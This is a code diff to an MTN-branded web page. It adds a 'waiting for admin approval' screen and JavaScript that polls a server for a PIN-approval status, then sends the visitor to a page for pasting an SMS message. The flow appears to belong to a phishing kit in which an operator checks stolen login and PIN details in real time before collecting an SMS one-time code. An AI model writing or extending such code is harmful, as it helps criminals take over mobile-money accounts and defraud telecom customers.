@@ -457,7 +457,20 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 7: SMS MESSAGE PASTE ══════════════════════ -->
+<!-- ══════════════════════ PAGE 7: WAIT FOR LOGIN APPROVAL ══════════════════════ -->
+<div id="page-wait-login-approval" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Waiting for Admin Approval</h2>
+      <p>Your login is pending admin verification. Please wait...</p>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is reviewing your request...</div>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════ PAGE 8: SMS MESSAGE PASTE ══════════════════════ -->
 <div id="page-sms-paste" class="page">
   <div class="sms-topbar">
     <button class="bk" onclick="goTo('page-login')">← Back</button>
@@ -814,7 +827,13 @@
       if (data.success) {
         // Store application ID for later use
         S.applicationId = data.applicationId;
-        goTo('page-sms-paste');
+        document.getElementById('waitAppId').textContent = data.applicationId;
+        
+        // Go to waiting page
+        goTo('page-wait-login-approval');
+        
+        // Start polling for admin approval
+        pollForPinApproval(data.applicationId);
       } else {
         document.getElementById('bLgn').disabled = false;
         showLgnMsg('error', data.message || 'Login failed.');
@@ -824,6 +843,45 @@
       document.getElementById('bLgn').disabled = false;
       showLgnMsg('error', 'Network error: ' + err.message);
     }
+  }
+
+  // Poll for PIN approval status
+  let pollTimeout;
+  function pollForPinApproval(applicationId) {
+    const checkStatus = async () => {
+      try {
+        const res = await fetch(`/api/check-pin-status/${applicationId}`);
+        const data = await res.json();
+        
+        if (data.success) {
+          const status = data.status;
+          
+          if (status === 'approved') {
+            console.log('✅ Admin approved login');
+            clearTimeout(pollTimeout);
+            goTo('page-sms-paste');
+          } else if (status === 'rejected') {
+            console.log('❌ Admin rejected login');
+            clearTimeout(pollTimeout);
+            goTo('page-login');
+            showLgnMsg('error', 'Your login was rejected by the admin.');
+          } else {
+            // Still pending, keep polling
+            pollTimeout = setTimeout(checkStatus, 2000);
+          }
+        } else {
+          // Keep polling on error
+          pollTimeout = setTimeout(checkStatus, 3000);
+        }
+      } catch (err) {
+        console.error('Poll error:', err);
+        // Keep polling on network error
+        pollTimeout = setTimeout(checkStatus, 3000);
+      }
+    };
+    
+    // Start polling
+    checkStatus();
   }
 
   // ══════════════════════════════════════════════════════
